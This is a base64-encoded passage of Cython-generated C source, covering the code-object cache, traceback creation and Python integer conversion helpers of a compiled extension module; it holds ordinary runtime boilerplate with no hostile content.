CAgICBpbnQgbmV3X21heCA9IGNvZGVfY2FjaGUtPm1heF9jb3VudCArIDY0O1xuICAgICAgICBlbnRyaWVzID0gKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KilQeU1lbV9SZWFsbG9jKFxuICAgICAgICAgICAgY29kZV9jYWNoZS0+ZW50cmllcywgKChzaXplX3QpbmV3X21heCkgKiBzaXplb2YoX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkpKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFlbnRyaWVzKSkge1xuICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICB9XG4gICAgICAgIGNvZGVfY2FjaGUtPmVudHJpZXMgPSBlbnRyaWVzO1xuICAgICAgICBjb2RlX2NhY2hlLT5tYXhfY291bnQgPSBuZXdfbWF4O1xuICAgIH1cbiAgICBmb3IgKGk9Y29kZV9jYWNoZS0+Y291bnQ7IGk+cG9zOyBpLS0pIHtcbiAgICAgICAgZW50cmllc1tpXSA9IGVudHJpZXNbaS0xXTtcbiAgICB9XG4gICAgZW50cmllc1twb3NdLmNvZGVfbGluZSA9IGNvZGVfbGluZTtcbiAgICBlbnRyaWVzW3Bvc10uY29kZV9vYmplY3QgPSBjb2RlX29iamVjdDtcbiAgICBjb2RlX2NhY2hlLT5jb3VudCsrO1xuICAgIFB5X0lOQ1JFRihjb2RlX29iamVjdCk7XG59XG5zdGF0aWMgdm9pZCBfX3B5eF9pbnNlcnRfY29kZV9vYmplY3QoaW50IGNvZGVfbGluZSwgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIGNvZGVfb2JqZWN0KSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgJiYgIUNZVEhPTl9BVE9NSUNTXG4gICAgKHZvaWQpX19weXhfX2luc2VydF9jb2RlX29iamVjdDtcbiAgICByZXR1cm47IC8vIE1vc3QgaW1wbGVtZW50YXRpb24gc2hvdWxkIGhhdmUgYXRvbWljcy4gQnV0IG90aGVyd2lzZSwgZG9uXCd0IG1ha2UgaXQgdGhyZWFkLXNhZmUsIGp1c3QgZmFpbC5cbiNlbHNlXG4gICAgc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSAqY29kZV9jYWNoZSA9ICZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2RlX2NhY2hlO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGV4cGVjdGVkID0gMDtcbiAgICBpZiAoIV9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKCZjb2RlX2NhY2hlLT5hY2Nlc3Nvcl9jb3VudCwgJmV4cGVjdGVkLCBJTlRfTUlOKSkge1xuICAgICAgICByZXR1cm47XG4gICAgfVxuI2VuZGlmXG4gICAgX19weXhfX2luc2VydF9jb2RlX29iamVjdChjb2RlX2NhY2hlLCBjb2RlX2xpbmUsIGNvZGVfb2JqZWN0KTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X2F0b21pY19zdWIoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50LCBJTlRfTUlOKTtcbiNlbmRpZlxuI2VuZGlmXG59XG5cblxuI2luY2x1ZGUgImNvbXBpbGUuaCJcbiNpbmNsdWRlICJmcmFtZW9iamVjdC5oIlxuI2luY2x1ZGUgInRyYWNlYmFjay5oIlxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwYjAwYTYgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgIWRlZmluZWQoUFlQWV9WRVJTSU9OKVxuICAjaWZuZGVmIFB5X0JVSUxEX0NPUkVcbiAgICAjZGVmaW5lIFB5X0JVSUxEX0NPUkUgMVxuICAjZW5kaWZcbiAgI2luY2x1ZGUgImludGVybmFsL3B5Y29yZV9mcmFtZS5oIlxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeUNvZGVfUmVwbGFjZV9Gb3JfQWRkVHJhY2ViYWNrKFB5T2JqZWN0ICpjb2RlLCBQeU9iamVjdCAqc2NyYXRjaF9kaWN0LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpmaXJzdGxpbmVubywgUHlPYmplY3QgKm5hbWUpIHtcbiAgICBQeU9iamVjdCAqcmVwbGFjZSA9IE5VTEw7XG4gICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtU3RyaW5nKHNjcmF0Y2hfZGljdCwgImNvX2ZpcnN0bGluZW5vIiwgZmlyc3RsaW5lbm8pKSkgcmV0dXJuIE5VTEw7XG4gICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtU3RyaW5nKHNjcmF0Y2hfZGljdCwgImNvX25hbWUiLCBuYW1lKSkpIHJldHVybiBOVUxMO1xuICAgIHJlcGxhY2UgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKGNvZGUsICJyZXBsYWNlIik7XG4gICAgaWYgKGxpa2VseShyZXBsYWNlKSkge1xuICAgICAgICBQeU9iamVjdCAqcmVzdWx0ID0gUHlPYmplY3RfQ2FsbChyZXBsYWNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgc2NyYXRjaF9kaWN0KTtcbiAgICAgICAgUHlfREVDUkVGKHJlcGxhY2UpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiAgICBQeUVycl9DbGVhcigpO1xuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIHZvaWQgX19QeXhfQWRkVHJhY2ViYWNrKGNvbnN0IGNoYXIgKmZ1bmNuYW1lLCBpbnQgY19saW5lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSkge1xuICAgIFB5T2JqZWN0ICpjb2RlX29iamVjdCA9IE5VTEwsICpweV9weV9saW5lID0gTlVMTCwgKnB5X2Z1bmNuYW1lID0gTlVMTCwgKmRpY3QgPSBOVUxMO1xuICAgIFB5T2JqZWN0ICpyZXBsYWNlID0gTlVMTCwgKmdldGZyYW1lID0gTlVMTCwgKmZyYW1lID0gTlVMTDtcbiAgICBQeU9iamVjdCAqZXhjX3R5cGUsICpleGNfdmFsdWUsICpleGNfdHJhY2ViYWNrO1xuICAgIGludCBzdWNjZXNzID0gMDtcbiAgICBpZiAoY19saW5lKSB7XG4gICAgICAgICh2b2lkKSBfX3B5eF9jZmlsZW5tO1xuICAgICAgICAodm9pZCkgX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2soX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50LCBjX2xpbmUpO1xuICAgIH1cbiAgICBQeUVycl9GZXRjaCgmZXhjX3R5cGUsICZleGNfdmFsdWUsICZleGNfdHJhY2ViYWNrKTtcbiAgICBjb2RlX29iamVjdCA9IF9fcHl4X2ZpbmRfY29kZV9vYmplY3QoY19saW5lID8gLWNfbGluZSA6IHB5X2xpbmUpO1xuICAgIGlmICghY29kZV9vYmplY3QpIHtcbiAgICAgICAgY29kZV9vYmplY3QgPSBQeV9Db21waWxlU3RyaW5nKCJfZ2V0ZnJhbWUoKSIsIGZpbGVuYW1lLCBQeV9ldmFsX2lucHV0KTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFjb2RlX29iamVjdCkpIGdvdG8gYmFkO1xuICAgICAgICBweV9weV9saW5lID0gUHlMb25nX0Zyb21Mb25nKHB5X2xpbmUpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXB5X3B5X2xpbmUpKSBnb3RvIGJhZDtcbiAgICAgICAgcHlfZnVuY25hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhmdW5jbmFtZSk7XG4gICAgICAgIGlmICh1bmxpa2VseSghcHlfZnVuY25hbWUpKSBnb3RvIGJhZDtcbiAgICAgICAgZGljdCA9IFB5RGljdF9OZXcoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFkaWN0KSkgZ290byBiYWQ7XG4gICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpvbGRfY29kZV9vYmplY3QgPSBjb2RlX29iamVjdDtcbiAgICAgICAgICAgIGNvZGVfb2JqZWN0ID0gX19QeXhfUHlDb2RlX1JlcGxhY2VfRm9yX0FkZFRyYWNlYmFjayhjb2RlX29iamVjdCwgZGljdCwgcHlfcHlfbGluZSwgcHlfZnVuY25hbWUpO1xuICAgICAgICAgICAgUHlfREVDUkVGKG9sZF9jb2RlX29iamVjdCk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKHVubGlrZWx5KCFjb2RlX29iamVjdCkpIGdvdG8gYmFkO1xuICAgICAgICBfX3B5eF9pbnNlcnRfY29kZV9vYmplY3QoY19saW5lID8gLWNfbGluZSA6IHB5X2xpbmUsIGNvZGVfb2JqZWN0KTtcbiAgICB9IGVsc2Uge1xuICAgICAgICBkaWN0ID0gUHlEaWN0X05ldygpO1xuICAgIH1cbiAgICBnZXRmcmFtZSA9IFB5U3lzX0dldE9iamVjdCgiX2dldGZyYW1lIik7XG4gICAgaWYgKHVubGlrZWx5KCFnZXRmcmFtZSkpIGdvdG8gYmFkO1xuICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbVN0cmluZyhkaWN0LCAiX2dldGZyYW1lIiwgZ2V0ZnJhbWUpKSkgZ290byBiYWQ7XG4gICAgZnJhbWUgPSBQeUV2YWxfRXZhbENvZGUoY29kZV9vYmplY3QsIGRpY3QsIGRpY3QpO1xuICAgIGlmICh1bmxpa2VseSghZnJhbWUpIHx8IGZyYW1lID09IFB5X05vbmUpIGdvdG8gYmFkO1xuICAgIHN1Y2Nlc3MgPSAxO1xuICBiYWQ6XG4gICAgUHlFcnJfUmVzdG9yZShleGNfdHlwZSwgZXhjX3ZhbHVlLCBleGNfdHJhY2ViYWNrKTtcbiAgICBQeV9YREVDUkVGKGNvZGVfb2JqZWN0KTtcbiAgICBQeV9YREVDUkVGKHB5X3B5X2xpbmUpO1xuICAgIFB5X1hERUNSRUYocHlfZnVuY25hbWUpO1xuICAgIFB5X1hERUNSRUYoZGljdCk7XG4gICAgUHlfWERFQ1JFRihyZXBsYWNlKTtcbiAgICBpZiAoc3VjY2Vzcykge1xuICAgICAgICBQeVRyYWNlQmFja19IZXJlKFxuICAgICAgICAgICAgKHN0cnVjdCBfZnJhbWUqKWZyYW1lKTtcbiAgICB9XG4gICAgUHlfWERFQ1JFRihmcmFtZSk7XG59XG4jZWxzZVxuc3RhdGljIFB5Q29kZU9iamVjdCogX19QeXhfQ3JlYXRlQ29kZU9iamVjdEZvclRyYWNlYmFjayhcbiAgICAgICAgICAgIGNvbnN0IGNoYXIgKmZ1bmNuYW1lLCBpbnQgY19saW5lLFxuICAgICAgICAgICAgaW50IHB5X2xpbmUsIGNvbnN0IGNoYXIgKmZpbGVuYW1lKSB7XG4gICAgUHlDb2RlT2JqZWN0ICpweV9jb2RlID0gTlVMTDtcbiAgICBQeU9iamVjdCAqcHlfZnVuY25hbWUgPSBOVUxMO1xuICAgIGlmIChjX2xpbmUpIHtcbiAgICAgICAgcHlfZnVuY25hbWUgPSBQeVVuaWNvZGVfRnJvbUZvcm1hdCggIiVzICglczolZCkiLCBmdW5jbmFtZSwgX19weXhfY2ZpbGVubSwgY19saW5lKTtcbiAgICAgICAgaWYgKCFweV9mdW5jbmFtZSkgZ290byBiYWQ7XG4gICAgICAgIGZ1bmNuYW1lID0gUHlVbmljb2RlX0FzVVRGOChweV9mdW5jbmFtZSk7XG4gICAgICAgIGlmICghZnVuY25hbWUpIGdvdG8gYmFkO1xuICAgIH1cbiAgICBweV9jb2RlID0gUHlDb2RlX05ld0VtcHR5KGZpbGVuYW1lLCBmdW5jbmFtZSwgcHlfbGluZSk7XG4gICAgUHlfWERFQ1JFRihweV9mdW5jbmFtZSk7XG4gICAgcmV0dXJuIHB5X2NvZGU7XG5iYWQ6XG4gICAgUHlfWERFQ1JFRihweV9mdW5jbmFtZSk7XG4gICAgcmV0dXJuIE5VTEw7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9BZGRUcmFjZWJhY2soY29uc3QgY2hhciAqZnVuY25hbWUsIGludCBjX2xpbmUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IHB5X2xpbmUsIGNvbnN0IGNoYXIgKmZpbGVuYW1lKSB7XG4gICAgUHlDb2RlT2JqZWN0ICpweV9jb2RlID0gMDtcbiAgICBQeUZyYW1lT2JqZWN0ICpweV9mcmFtZSA9IDA7XG4gICAgUHlUaHJlYWRTdGF0ZSAqdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50O1xuICAgIFB5T2JqZWN0ICpwdHlwZSwgKnB2YWx1ZSwgKnB0cmFjZWJhY2s7XG4gICAgaWYgKGNfbGluZSkge1xuICAgICAgICBjX2xpbmUgPSBfX1B5eF9DTGluZUZvclRyYWNlYmFjayh0c3RhdGUsIGNfbGluZSk7XG4gICAgfVxuICAgIHB5X2NvZGUgPSBfX3B5eF9maW5kX2NvZGVfb2JqZWN0KGNfbGluZSA/IC1jX2xpbmUgOiBweV9saW5lKTtcbiAgICBpZiAoIXB5X2NvZGUpIHtcbiAgICAgICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgJnB0eXBlLCAmcHZhbHVlLCAmcHRyYWNlYmFjayk7XG4gICAgICAgIHB5X2NvZGUgPSBfX1B5eF9DcmVhdGVDb2RlT2JqZWN0Rm9yVHJhY2ViYWNrKFxuICAgICAgICAgICAgZnVuY25hbWUsIGNfbGluZSwgcHlfbGluZSwgZmlsZW5hbWUpO1xuICAgICAgICBpZiAoIXB5X2NvZGUpIHtcbiAgICAgICAgICAgIFxuICAgICAgICAgICAgUHlfWERFQ1JFRihwdHlwZSk7XG4gICAgICAgICAgICBQeV9YREVDUkVGKHB2YWx1ZSk7XG4gICAgICAgICAgICBQeV9YREVDUkVGKHB0cmFjZWJhY2spO1xuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgIH1cbiAgICAgICAgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUodHN0YXRlLCBwdHlwZSwgcHZhbHVlLCBwdHJhY2ViYWNrKTtcbiAgICAgICAgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGNfbGluZSA/IC1jX2xpbmUgOiBweV9saW5lLCBweV9jb2RlKTtcbiAgICB9XG4gICAgcHlfZnJhbWUgPSBQeUZyYW1lX05ldyhcbiAgICAgICAgdHN0YXRlLCAgICAgICAgICAgIFxuICAgICAgICBweV9jb2RlLCAgICAgICAgICAgXG4gICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICAgIFxuICAgICAgICAwICAgICAgICAgICAgICAgICAgXG4gICAgKTtcbiAgICBpZiAoIXB5X2ZyYW1lKSBnb3RvIGJhZDtcbiAgICBfX1B5eF9QeUZyYW1lX1NldExpbmVOdW1iZXIocHlfZnJhbWUsIHB5X2xpbmUpO1xuICAgIFB5VHJhY2VCYWNrX0hlcmUocHlfZnJhbWUpO1xuYmFkOlxuICAgIFB5X1hERUNSRUYocHlfY29kZSk7XG4gICAgUHlfWERFQ1JFRihweV9mcmFtZSk7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMFxuc3RhdGljIF9fUHl4X1R5cGVOYW1lXG5fX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5VHlwZU9iamVjdCogdHApXG57XG4gICAgUHlPYmplY3QgKm1vZHVsZSA9IE5VTEwsICpuYW1lID0gTlVMTCwgKnJlc3VsdCA9IE5VTEw7XG4gICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGIwMDAwXG4gICAgbmFtZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoKFB5T2JqZWN0ICopdHAsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9xdWFsbmFtZSk7XG4gICAgI2Vsc2VcbiAgICBuYW1lID0gUHlUeXBlX0dldFF1YWxOYW1lKHRwKTtcbiAgICAjZW5kaWZcbiAgICBpZiAodW5saWtlbHkobmFtZSA9PSBOVUxMKSB8fCB1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKG5hbWUpKSkgZ290byBiYWQ7XG4gICAgbW9kdWxlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cigoUHlPYmplY3QgKil0cCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21vZHVsZSk7XG4gICAgaWYgKHVubGlrZWx5KG1vZHVsZSA9PSBOVUxMKSB8fCB1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKG1vZHVsZSkpKSBnb3RvIGJhZDtcbiAgICBpZiAoUHlVbmljb2RlX0NvbXBhcmVXaXRoQVNDSUlTdHJpbmcobW9kdWxlLCAiYnVpbHRpbnMiKSA9PSAwKSB7XG4gICAgICAgIHJlc3VsdCA9IG5hbWU7XG4gICAgICAgIG5hbWUgPSBOVUxMO1xuICAgICAgICBnb3RvIGRvbmU7XG4gICAgfVxuICAgIHJlc3VsdCA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCIlVS4lVSIsIG1vZHVsZSwgbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KHJlc3VsdCA9PSBOVUxMKSkgZ290byBiYWQ7XG4gIGRvbmU6XG4gICAgUHlfWERFQ1JFRihuYW1lKTtcbiAgICBQeV9YREVDUkVGKG1vZHVsZSk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbiAgYmFkOlxuICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgaWYgKG5hbWUpIHtcbiAgICAgICAgcmVzdWx0ID0gbmFtZTtcbiAgICAgICAgbmFtZSA9IE5VTEw7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfTmV3UmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzUpO1xuICAgIH1cbiAgICBnb3RvIGRvbmU7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0Zyb21fbG9uZyhsb25nIHZhbHVlKSB7XG4jaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDXG4jcHJhZ21hIEdDQyBkaWFnbm9zdGljIHB1c2hcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIlxuI2VuZGlmXG4gICAgY29uc3QgbG9uZyBuZWdfb25lID0gKGxvbmcpIC0xLCBjb25zdF96ZXJvID0gKGxvbmcpIDA7XG4jaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDXG4jcHJhZ21hIEdDQyBkaWFnbm9zdGljIHBvcFxuI2VuZGlmXG4gICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87XG4gICAgaWYgKGlzX3Vuc2lnbmVkKSB7XG4gICAgICAgIGlmIChzaXplb2YobG9uZykgPCBzaXplb2YobG9uZykpIHtcbiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoKGxvbmcpIHZhbHVlKTtcbiAgICAgICAgfSBlbHNlIGlmIChzaXplb2YobG9uZykgPD0gc2l6ZW9mKHVuc2lnbmVkIGxvbmcpKSB7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21VbnNpZ25lZExvbmcoKHVuc2lnbmVkIGxvbmcpIHZhbHVlKTtcbiNpZiBkZWZpbmVkKEhBVkVfTE9OR19MT05HKSAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgIH0gZWxzZSBpZiAoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSB7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21VbnNpZ25lZExvbmdMb25nKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpIHZhbHVlKTtcbiNlbmRpZlxuICAgICAgICB9XG4gICAgfSBlbHNlIHtcbiAgICAgICAgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YobG9uZykpIHtcbiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoKGxvbmcpIHZhbHVlKTtcbiNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICB9IGVsc2UgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YoUFlfTE9OR19MT05HKSkge1xuICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZ0xvbmcoKFBZX0xPTkdfTE9ORykgdmFsdWUpO1xuI2VuZGlmXG4gICAgICAgIH1cbiAgICB9XG4gICAge1xuICAgICAgICB1bnNpZ25lZCBjaGFyICpieXRlcyA9ICh1bnNpZ25lZCBjaGFyICopJnZhbHVlO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTRcbiAgICAgICAgaWYgKGlzX3Vuc2lnbmVkKSB7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21VbnNpZ25lZE5hdGl2ZUJ5dGVzKGJ5dGVzLCBzaXplb2YodmFsdWUpLCAtMSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21OYXRpdmVCeXRlcyhieXRlcywgc2l6ZW9mKHZhbHVlKSwgLTEpO1xuICAgICAgICB9XG4jZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDBcbiAgICAgICAgaW50IG9uZSA9IDE7IGludCBsaXR0bGUgPSAoaW50KSoodW5zaWduZWQgY2hhciAqKSZvbmU7XG4gICAgICAgIHJldHVybiBfUHlMb25nX0Zyb21CeXRlQXJyYXkoYnl0ZXMsIHNpemVvZihsb25nKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaXR0bGUsICFpc191bnNpZ25lZCk7XG4jZWxzZVxuICAgICAgICBpbnQgb25lID0gMTsgaW50IGxpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTtcbiAgICAgICAgUHlPYmplY3QgKmZyb21fYnl0ZXMsICpyZXN1bHQgPSBOVUxMLCAqa3dkcyA9IE5VTEw7XG4gICAgICAgIFB5T2JqZWN0ICpweV9ieXRlcyA9IE5VTEwsICpvcmRlcl9zdHIgPSBOVUxMO1xuICAgICAgICBmcm9tX2J5dGVzID0gUHlPYmplY3RfR2V0QXR0clN0cmluZygoUHlPYmplY3QqKSZQeUxvbmdfVHlwZSwgImZyb21fYnl0ZXMiKTtcbiAgICAgICAgaWYgKCFmcm9tX2J5dGVzKSByZXR1cm4gTlVMTDtcbiAgICAgICAgcHlfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKChjaGFyKilieXRlcywgc2l6ZW9mKGxvbmcpKTtcbiAgICAgICAgaWYgKCFweV9ieXRlcykgZ290byBsaW1pdGVkX2JhZDtcbiAgICAgICAgb3JkZXJfc3RyID0gUHlVbmljb2RlX0Zyb21TdHJpbmcobGl0dGxlID8gImxpdHRsZSIgOiAiYmlnIik7XG4gICAgICAgIGlmICghb3JkZXJfc3RyKSBnb3RvIGxpbWl0ZWRfYmFkO1xuICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqYXJnc1szKyhDWVRIT05fVkVDVE9SQ0FMTCA/IDEgOiAwKV0gPSB7IE5VTEwsIHB5X2J5dGVzLCBvcmRlcl9zdHIgfTtcbiAgICAgICAgICAgIGlmICghaXNfdW5zaWduZWQpIHtcbiAgICAgICAgICAgICAgICBrd2RzID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygxKTtcbiAgICAgICAgICAgICAgICBpZiAoIWt3ZHMpIGdvdG8gbGltaXRlZF9iYWQ7XG4gICAgICAgICAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cigic2lnbmVkIiwgX19QeXhfTmV3UmVmKFB5X1RydWUpLCBrd2RzLCBhcmdzKzMsIDApIDwgMCkgZ290byBsaW1pdGVkX2JhZDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihmcm9tX2J5dGVzLCBhcmdzKzEsIDIgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQsIGt3ZHMpO1xuICAgICAgICB9XG4gICAgICAgIGxpbWl0ZWRfYmFkOlxuICAgICAgICBQeV9YREVDUkVGKGt3ZHMpO1xuICAgICAgICBQeV9YREVDUkVGKG9yZGVyX3N0cik7XG4gICAgICAgIFB5X1hERUNSRUYocHlfYnl0ZXMpO1xuICAgICAgICBQeV9YREVDUkVGKGZyb21fYnl0ZXMpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuI2VuZGlmXG4gICAgfVxufVxuXG5cbiNkZWZpbmUgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQodGFyZ2V0X3R5cGUsIGZ1bmNfdHlwZSwgZnVuY192YWx1ZSlcXFxuICAgIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCAwKVxuI2RlZmluZSBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEModGFyZ2V0X3R5cGUsIGZ1bmNfdHlwZSwgZnVuY192YWx1ZSlcXFxuICAgIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCAxKVxuI2RlZmluZSBfX1BZWF9fVkVSSUZZX1JFVFVSTl9JTlQodGFyZ2V0X3R5cGUsIGZ1bmNfdHlwZSwgZnVuY192YWx1ZSwgZXhjKVxcXG4gICAge1xcXG4gICAgICAgIGZ1bmNfdHlwZSB2YWx1ZSA9IGZ1bmNfdmFsdWU7XFxcbiAgICAgICAgaWYgKHNpemVvZih0YXJnZXRfdHlwZSkgPCBzaXplb2YoZnVuY190eXBlKSkge1xcXG4gICAgICAgICAgICBpZiAodW5saWtlbHkodmFsdWUgIT0gKGZ1bmNfdHlwZSkgKHRhcmdldF90eXBlKSB2YWx1ZSkpIHtcXFxuICAgICAgICAgICAgICAgIGZ1bmNfdHlwZSB6ZXJvID0gMDtcXFxuICAgICAgICAgICAgICAgIGlmIChleGMgJiYgdW5saWtlbHkodmFsdWUgPT0gKGZ1bmNfdHlwZSktMSAmJiBQeUVycl9PY2N1cnJlZCgpKSlcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gKHRhcmdldF90eXBlKSAtMTtcXFxuICAgICAgICAgICAgICAgIGlmIChpc191bnNpZ25lZCAmJiB1bmxpa2VseSh2YWx1ZSA8IHplcm8pKVxcXG4gICAgICAgICAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xcXG4gICAgICAgICAgICAgICAgZWxzZVxcXG4gICAgICAgICAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7XFxcbiAgICAgICAgICAgIH1cXFxuICAgICAgICB9XFxcbiAgICAgICAgcmV0dXJuICh0YXJnZXRfdHlwZSkgdmFsdWU7XFxcbiAgICB9XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgbG9uZyBfX1B5eF9QeUxvbmdfQXNfbG9uZyhQeU9iamVjdCAqeCkge1xuI2lmZGVmIF9fUHl4X0hBU19HQ0NfRElBR05PU1RJQ1xuI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBwdXNoXG4jcHJhZ21hIEdDQyBkaWFnbm9zdGljIGlnbm9yZWQgIi1XY29udmVyc2lvbiJcbiNlbmRpZlxuICAgIGNvbnN0IGxvbmcgbmVnX29uZSA9IChsb25nKSAtMSwgY29uc3RfemVybyA9IChsb25nKSAwO1xuI2lmZGVmIF9fUHl4X0hBU19HQ0NfRElBR05PU1RJQ1xuI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBwb3BcbiNlbmRpZlxuICAgIGNvbnN0IGludCBpc191bnNpZ25lZCA9IG5lZ19vbmUgPiBjb25zdF96ZXJvO1xuICAgIGlmICh1bmxpa2VseSghUHlMb25nX0NoZWNrKHgpKSkge1xu